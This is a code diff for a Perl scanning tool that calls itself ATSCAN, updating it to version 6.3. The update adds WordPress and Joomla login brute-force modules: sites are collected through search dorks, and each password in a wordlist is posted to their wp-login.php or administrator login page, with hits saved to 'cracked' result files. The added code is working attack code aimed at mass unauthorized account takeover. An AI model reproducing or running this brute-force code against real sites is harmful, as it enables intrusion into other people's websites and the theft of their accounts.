@@ -166,6 +166,10 @@ my $mmails;
 my $rangip;
 my $nobanner;
 my $beep;
+my $wpbf;
+my $username;
+my $password;
+my $joombf;
 
 Getopt::Long::GetOptions(\my %OPT,
                         'proxy=s' => \$proxy,
@@ -212,6 +216,10 @@ Getopt::Long::GetOptions(\my %OPT,
 						'rang=s' => \$rangip,
 						'nobanner' => \$nobanner,
 						'beep' => \$beep,
+						'wpbf' => \$wpbf,
+						'joombf' => \$joombf,
+						'user=s' => \$username,
+						'pass=s' => \$password,
 ) or advise();
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
@@ -432,7 +440,7 @@ if (defined $proxy) {
 ############################################################################################################################################################################################
 ## TOOL VERSION
 sub existantversion {
-  $existantversion='version 6.2 Stable';
+  $existantversion='version 6.3 Stable';
   return $existantversion;
 }
 ############################################################################################################################################################################################
@@ -626,6 +634,18 @@ sub scandetail {
   }
   #########################################
   #########################################
+  if (defined $password) {
+    print color 'bold yellow';
+    print "[+] LIST:: ";
+    print color RESET;
+    print color 'cyan';
+    print "[$password][";
+	countpasswordlist();
+	print "]\n";
+    print color RESET;
+  }
+  #########################################
+  #########################################
   if ((defined $misup) || (defined $validation_text)) {
     print color 'bold yellow';
     print "[+] VALIDATION:: ";
@@ -676,7 +696,7 @@ sub scandetail {
   }
   #########################################
   #########################################
-  if ((defined $mxss) || (defined $mlfi) || (defined $madmin) || (defined $mjoomrfi) || (defined $mwpadf) || (defined $mports) || (defined $mupload) || (defined $mzip) || (defined $mmails)){
+  if ((defined $mxss) || (defined $mlfi) || (defined $madmin) || (defined $mjoomrfi) || (defined $mwpadf) || (defined $mports) || (defined $mupload) || (defined $mzip) || (defined $mmails) || (defined $joombf) || (defined $wpbf)){
     print color 'bold yellow';
     print "[+] SCAN:: ";
     print color RESET;
@@ -707,6 +727,12 @@ sub scandetail {
     }
     if (defined $mmails) {
       print "/E-mails ";
+    }
+	if (defined $wpbf) {
+      print "/WP Brute Force ";
+    }
+	if (defined $joombf) {
+      print "/Joom Brute Force ";
     }
     print color RESET;
 	print "\n";
@@ -888,9 +914,9 @@ sub dorklist {
 	  if ($Target =~ m/$pat2/) {
 	    $Target =~ s/$pat2//g;
         $Target =~ s/ /+/g;
-      }elsif ($dork =~ m/$pat3/) {
+      }elsif ($Target =~ m/$pat3/) {
         $Target =~ s/$pat3/ /g;
-      }elsif ($dork =~ m/ /) {
+      }elsif ($Target =~ m/ /) {
         $Target =~ s/ /+/g;
 	  }
       my @targets = split / /, $Target;
@@ -958,9 +984,9 @@ sub targetlist {
 	  if ($Target =~ m/$pat2/) {
 	    $Target =~ s/$pat2//g;
         $Target =~ s/ /+/g;
-      }elsif ($dork =~ m/$pat3/) {
+      }elsif ($Target =~ m/$pat3/) {
         $Target =~ s/$pat3/ /g;
-      }elsif ($dork =~ m/ /) {
+      }elsif ($Target =~ m/ /) {
         $Target =~ s/ /+/g;
 	  }
       my @targets = split / /, $Target;
@@ -1033,6 +1059,16 @@ sub countdorkslist {
   open $file, "<", $file;
   $lc++ while <$file>;
   print "$lc";
+  close $file;
+}
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+sub countpasswordlist {
+  my $lcpass = 0;
+  my $file = $password;
+  open $file, "<", $file;
+  $lcpass++ while <$file>;
+  print "$lcpass Password(s) found in list";
   close $file;
 }
 ############################################################################################################################################################################################
@@ -1431,7 +1467,7 @@ sub msearch {
     chomp $dork;
 	$count++;
 
-	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $replace) && (!defined $with) && (!defined $mmails)) {
+	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $replace) && (!defined $with) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
       print color 'bold magenta';
 	  timer();
 	  print "[$count/";
@@ -1463,7 +1499,7 @@ sub msearch {
 			if ($repeat{$URL}) {
 			}else{
 			  if ($URL !~ /http:\/\//) { $URL = "http://$URL"; };
-	          if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $replace) && (!defined $with)) {
+	          if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $replace) && (!defined $with) && (!defined $wpbf) && (!defined $joombf)) {
 	            print color 'bold';
 	            timer();
 	            print "[$count]\n";
@@ -1540,7 +1576,7 @@ sub msearch {
 	print color RESET;
 	close $file;
     print color RESET;
-	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $replace) && (!defined $with)) {
+	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $replace) && (!defined $with) && (!defined $wpbf) && (!defined $joombf)) {
       print color 'green';
 	  if (defined $output) {
 		if (-e $output){ unlink $output};
@@ -1638,7 +1674,7 @@ sub misup {
     subfin();
 	exit();
   }
-  if ((!defined $validation_text) && (!defined $mxss) && (!defined $mlfi) && (!defined $command) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails)) {
+  if ((!defined $validation_text) && (!defined $mxss) && (!defined $mlfi) && (!defined $command) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
     exit();
   }
 }
@@ -1710,7 +1746,7 @@ sub mvalidation {
     subfin();
 	exit();
   }
-  if ((!defined $misup) && (!defined $mxss) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails)) {
+  if ((!defined $misup) && (!defined $mxss) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
     exit();
   }
 }
@@ -1779,7 +1815,7 @@ sub mcommand {
   print "SCAN FINISHED!\n";
   print color RESET;
   
-  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $replace) && (!defined $with) && (!defined $mmails)) {
+  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $replace) && (!defined $with) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
     exit();
   }
 }
@@ -1848,7 +1884,7 @@ sub mxss {
     print "[!] No Results Found!\n";
     subfin();
   }
-  if ((!defined $sqlmap) && (!defined $mlfi) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+  if ((!defined $sqlmap) && (!defined $mlfi) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports) && (!defined $wpbf) && (!defined $joombf)) {
     exit();
   }
 }
@@ -1984,7 +2020,7 @@ sub sqlmap {
   }
   close(TEXT);
   print "[ ]............................................................................ \n";
-  if ((!defined $mwpadf) && (!defined $mlfi) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+  if ((!defined $mwpadf) && (!defined $mlfi) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports) && (!defined $wpbf) && (!defined $joombf)) {
     print color 'red';
 	timer();
     print "SCAN FINISHED!\n";
@@ -2061,7 +2097,7 @@ sub mlfi {
     print "[!] No Results Found!\n";
     subfin();
   }
-  if ((!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+  if ((!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports) && (!defined $wpbf) && (!defined $joombf)) {
     exit();
   }
 }
@@ -2136,7 +2172,7 @@ sub mjoomrfi {
     print "[!] No Results Found!\n";
     subfin();
   }
-  if ((!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+  if ((!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports) && (!defined $wpbf) && (!defined $joombf)) {
     exit();
   }
 }
@@ -2212,7 +2248,7 @@ sub mwpadf {
     print "[!] No Results Found!\n";
     subfin();
   }
-  if ((!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+  if ((!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports) && (!defined $wpbf) && (!defined $joombf)) {
     exit();
   }
 }
@@ -2288,7 +2324,7 @@ sub madmin {
     print "[!] No Results Found!\n";
     subfin();
   }
-  if ((!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+  if ((!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports) && (!defined $wpbf) && (!defined $joombf)) {
     exit();
   }
 }
@@ -2386,7 +2422,7 @@ sub msubdomain {
     print "[!] No Results Found!\n";
     subfin();
   }
-  if ((!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+  if ((!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports) && (!defined $wpbf) && (!defined $joombf)) {
     exit();
   }
 }
@@ -2458,7 +2494,7 @@ sub mwpsites {
     print "[!] No Results Found!\n";
     subfin();
   }
-  if ((!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+  if ((!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports) && (!defined $wpbf) && (!defined $joombf)) {
     exit();
   }
 }
@@ -2530,7 +2566,7 @@ sub mjoomsites {
     print "[!] No Results Found!\n";
     subfin();
   }
-  if ((!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+  if ((!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports) && (!defined $wpbf) && (!defined $joombf)) {
     exit();
   }
 }
@@ -2603,7 +2639,7 @@ sub muploadsites {
     print "[!] No Results Found!\n";
     subfin();
   }
-  if ((!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+  if ((!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports) && (!defined $wpbf) && (!defined $joombf)) {
     exit();
   }
 }
@@ -2676,7 +2712,7 @@ sub mzipsites {
     print "[!] No Results Found!\n";
     subfin();
   }
-  if ((!defined $command) && (!defined $mmails) && (!defined $mports)) {
+  if ((!defined $command) && (!defined $mmails) && (!defined $mports) && (!defined $wpbf) && (!defined $joombf)) {
     exit();
   }
 }
@@ -2742,7 +2778,7 @@ sub mmails {
     print "[!] No Results Found!\n";
     subfin();
   }
-  if ((!defined $command) && (!defined $mports)) {
+  if ((!defined $command) && (!defined $mports) && (!defined $wpbf) && (!defined $joombf)) {
     exit();
     unlink 'scan2.txt';
   }
@@ -3482,7 +3518,232 @@ sub user2 {
   print "SCAN FINISHED!\n";
   print color RESET;
 }
-
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+## BRUTE FORCE WORDPRESS SITES
+sub BFmwpsites {
+  if (-e 'scan.txt'){ unlink 'scan.txt';}
+  testconection();
+  if (!defined $mlevel) {
+    targetlist();
+  }
+  print color 'bold';
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
+  timer();
+  print "STARTING BRUTE FORCE WORDPRESS SITES SCAN ...\n";
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
+  print color RESET;
+  forwait();
+  $count=0;
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
+    $count++;
+	chomp $URL;
+    $URL = checkurltype($URL);
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	my $printarget = $URL;
+	if (index($URL, 'http://') != -1) {
+	  $URL =~ s/http:\/\///g;
+	}
+	$URL =~ s/\/.*//s;
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	print color 'bold magenta';
+	timer();
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
+	print color RESET;
+	print color 'bold';
+	print "    TARGET: ";
+	print color RESET;
+	print color 'blue';
+	print "$printarget\n";
+	print color RESET;
+    
+    if (defined $password) {
+      my $password=$password;
+    }
+    $URL1 = $URL."/wp-login.php";
+	$URL1 =~ s/ //g;
+    $request = HTTP::Request->new('GET', $URL1);
+    my $response = $ua->request($request);
+    my $status = $response->code;
+	print color 'bold';
+    print "    CMS:    ";
+    print color RESET;
+	if ($response->code==200) {
+	  print color 'green';
+      print "Wordpress!\n";
+	  print color RESET;
+      open(PASS,"<$password") or die "[!] Can not find $!";
+      while(<PASS>){
+        chomp($_);
+        my $ua = new LWP::UserAgent;
+        my $response = $ua->post($URL1, 
+                    { 'log' => $username, 
+                      'pwd' => $_,
+                      'wp-submit' => 'Log in',
+                    });
+        my $code = $response->code;
+	    print color 'BOLD';
+        print "    PASS:   ";
+	    print color RESET;
+	    print "$_\n";
+	    print color 'BOLD';
+        print "    SCAN:   ";
+	    print color RESET;
+        if($code == 302){
+	      print color 'green';
+          print "$URL1\n";
+	      print color RESET;
+        }else{
+	      print color 'red';
+          print "Not Vulnerable!\n";
+	      print color RESET;
+        }
+	    print "    [ ]...................................................................... \n";
+      }
+	}else{
+	  print color 'red';
+      print "Not Wordpress!\n";
+	  print color RESET;
+	}
+	print "[ ]............................................................................ \n";
+    close(PASS);
+  }
+  close(TEXT);
+  if (-e "crackedwp".getlist()) {unlink "crackedwp_".getlist();}
+  if (-e 'scan.txt') {
+    use File::Copy qw(copy);
+    copy 'scan.txt', "crackedwp_".getlist();
+	fincontinuemodule();
+	print color 'green';
+    print "[!] Results saved in $Bin/crackedwp_".getlist()."!\n";
+	print color RESET;
+    subfin();
+  }else{
+	print color 'red';
+    print "[!] No Results Found!\n";
+    subfin();
+  }
+  if ((!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports) && (!defined $joombf)) {
+    exit();
+  }
+}
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+## BRUTE FORCE JOOBLA SITES
+sub BFmjoomsites {
+  if (-e 'scan.txt'){ unlink 'scan.txt';}
+  testconection();
+  if (!defined $mlevel) {
+    targetlist();
+  }
+  print color 'bold';
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
+  timer();
+  print "STARTING BRUTE FORCE JOOMLA SITES SCAN ...\n";
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
+  print color RESET;
+  forwait();
+  $count=0;
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
+    $count++;
+	chomp $URL;
+    $URL = checkurltype($URL);
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	my $printarget = $URL;
+	if (index($URL, 'http://') != -1) {
+	  $URL =~ s/http:\/\///g;
+	}
+	$URL =~ s/\/.*//s;
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	print color 'bold magenta';
+	timer();
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
+	print color RESET;
+	print color 'bold';
+	print "    TARGET: ";
+	print color RESET;
+	print color 'blue';
+	print "$printarget\n";
+	print color RESET;
+    
+    if (defined $password) {
+      my $password=$password;
+    }
+    $URL1 = $URL."/administrator/index.php";
+	$URL1 =~ s/ //g;
+	
+    $request = HTTP::Request->new('GET', $URL1);
+    my $response = $ua->request($request);
+    my $status = $response->code;
+	print color 'bold';
+    print "    CMS:    ";
+    print color RESET;
+	
+	if ($response->code==200) {
+	  print color 'green';
+      print "Joomla!\n";
+	  print color RESET;
+      open(PASS,"<$password") or die "[!] Can not find $!";
+      while(<PASS>){
+        chomp($_);
+        my $ua = new LWP::UserAgent;
+        my $response = $ua->post($URL1, 
+                      { 'username' => $username, 
+                        'passwd' => $_,
+                        'submit' => 'Log in',
+                      });
+        my $code = $response->code;
+	    print color 'BOLD';
+        print "    PASS:   ";
+	    print color RESET;
+	    print "$_\n";
+	    print color 'BOLD';
+        print "    SCAN:   ";
+	    print color RESET;
+        if($code == 302){
+	      print color 'green';
+          print "$URL1\n";
+	      print color RESET;
+        }else{
+	      print color 'red';
+          print "Not Vulnerable!\n";
+	      print color RESET;
+        }
+	    print "    [ ]...................................................................... \n";
+      }
+	}else{
+	  print color 'red';
+      print "Not Joomla!\n";
+	  print color RESET;
+	}
+	print "[ ]............................................................................ \n";
+    close(PASS);
+  }
+  close(TEXT);
+  if (-e "crackedjoom".getlist()) {unlink "crackedjoom_".getlist();}
+  if (-e 'scan.txt') {
+    use File::Copy qw(copy);
+    copy 'scan.txt', "crackedjoom_".getlist();
+	fincontinuemodule();
+	print color 'green';
+    print "[!] Results saved in $Bin/crackedjoom_".getlist()."!\n";
+	print color RESET;
+    subfin();
+  }else{
+	print color 'red';
+    print "[!] No Results Found!\n";
+    subfin();
+  }
+  if ((!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    exit();
+  }
+}
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## ABOUT TOOL
@@ -3492,7 +3753,7 @@ sub mabout {
   print color 'bold cyan';
   print "
      [+]================================================================[+]
-     [+]--------------              ATSCAN V 6.2          --------------[+]
+     [+]--------------              ATSCAN V 6.3          --------------[+]
      [+]================================================================[+]
      [+]--------------           AlisamTechnology         --------------[+]
      [+]------ https://www.fb.com/Forces.des.tempetes.marocaines  ------[+]
@@ -3557,6 +3818,10 @@ sub help {
   print "   --email       | Get emails \n";
   print "   --save        | File Prefix to save scan [by defaut the tool create one if not set!]\n";
   print "   --rang        | Set ip range [Ex: --rang 124.12.10.144-22.36.14.152]\n";
+  print "   --wpbf        | Wordpress Login Brute Force\n";
+  print "   --joombf      | Joomla Login Brute Force\n";
+  print "   --user        | Set Username Login WP/JOOM Brute Force\n";
+  print "   --pass        | Set Password List Login WP/JOOM Brute Force\n";
   print "   --nobanner    | Hide tool banner\n";
   print "   --beep        | Produce beep sount if positive scan found.\n";
   print "   --update      | Check and update tool\n\n";
@@ -3642,6 +3907,11 @@ sub help {
   print "    -t <targets> --xss --lfi --wp ... \n";
   
   print color 'bold';
+  print "  Brute Force WP/JOOM Login: \n";
+  print color RESET;
+  print "    --dork <dork> --level <10> --wpbf/--joombf --pass password.txt \n";
+  
+  print color 'bold';
   print "  Check and update: \n";
   print color RESET;
   print "    --update\n\n";  
@@ -3650,7 +3920,7 @@ sub help {
 ############################################################################################################################################################################################
 ## ARGUMENTS VERIFICATION (TARGET AND RANGIP)
 if ((defined $Target) || (defined $rangip)) {
-  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $msites) && (!defined $mmails)) {
+  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $msites) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
   advise();
   }
 } 
@@ -3658,7 +3928,7 @@ if ((defined $Target) || (defined $rangip)) {
 ############################################################################################################################################################################################
 ## ARGUMENTS VERIFICATION (REPLACE)
 if ((defined $replace) && (defined $with)) {
-  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $msites) && (!defined $mmails)) {
+  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $msites) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
   advise();
   }
 }
@@ -3712,6 +3982,15 @@ if ((defined $dork) || (defined $Target) || (defined $rangip)) {
     print color 'RESET';
 	exit();
   }
+  if (((defined $wpbf) || (defined $joombf)) && ((!defined $username) && (!defined $password))){
+    print color 'bold';
+    print "[ ] ----------------------------------------------------------------------- [ ]\n";
+    print color 'RESET';
+    print color 'yellow';
+    print "[!] Invalid option! [Ex: --wpbf/joombf --user <value> --pass <pass.txt>]\n";
+    print color 'RESET';
+	exit();
+  }
 }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
@@ -3728,7 +4007,7 @@ if (defined $mlevel) {
   }
 
   if ((defined $dork) || (defined $Target) || (defined $rangip)){
-    if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails)) {
+    if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $wpbf) && (!defined $joombf) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails)) {
       submsearch();
       exit();
     }else{
@@ -3754,6 +4033,8 @@ if (defined $mlevel) {
 		if (defined $mupload) { muploadsites();}
 		if (defined $mzip) { mzipsites();}
 	    if (defined $mmails) { mmails();}
+	    if (defined $wpbf) { BFmwpsites();}
+	    if (defined $joombf) { BFmjoomsites();}
 	  }elsif (defined $Target) {
 	    if (defined $misup) { misup();}
 	    if (defined $validation_text) {mvalidation();}
@@ -3775,6 +4056,8 @@ if (defined $mlevel) {
 		if (defined $mupload) { muploadsites();}
 		if (defined $mzip) { mzipsites();}
 	    if (defined $mmails) { mmails();}
+	    if (defined $wpbf) { BFmwpsites();}
+	    if (defined $joombf) { BFmjoomsites();}
 	  }
     }
    exit();
@@ -3826,6 +4109,8 @@ if (defined $mlevel) {
 		}
 	  }
 	}
+	if (defined $wpbf) { BFmwpsites();}
+	if (defined $joombf) { BFmjoomsites();}
 	exit();
   }
 }
